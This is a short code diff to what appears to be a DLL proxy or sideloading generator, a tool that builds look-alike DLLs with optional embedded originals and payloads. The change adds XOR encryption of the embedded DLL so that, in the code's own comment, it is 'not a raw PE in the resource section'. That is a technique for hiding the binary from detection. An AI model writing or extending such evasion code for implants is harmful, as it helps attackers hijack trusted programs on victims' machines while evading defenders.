@@ -73,7 +73,7 @@ def main():
     original_dll_path = original_dll_filename
 
     generator = CodeGenerator()
-    files = generator.generate(
+    files, xor_key = generator.generate(
         export_table,
         embed_enabled=args.embed,
         payload_enabled=args.payload,
@@ -101,7 +101,12 @@ def main():
     embedder = ResourceEmbedder()
     if args.embed:
         copied_name = embedder.copy_original(dll_path, output_dir)
-        print(f"[+] Embedded: copied {dll_path.name} as {copied_name}")
+        # XOR-encrypt the embedded DLL so it's not a raw PE in the resource section
+        embedded_path = output_dir / copied_name
+        raw = embedded_path.read_bytes()
+        encrypted = bytes(b ^ xor_key[i % len(xor_key)] for i, b in enumerate(raw))
+        embedded_path.write_bytes(encrypted)
+        print(f"[+] Embedded: {dll_path.name} as {copied_name} (encrypted)")
     elif export_table.has_signature:
         copied_name = embedder.copy_original(dll_path, output_dir)
         print(f"[+] Copied {dll_path.name} as {copied_name} (signature source + runtime original)")
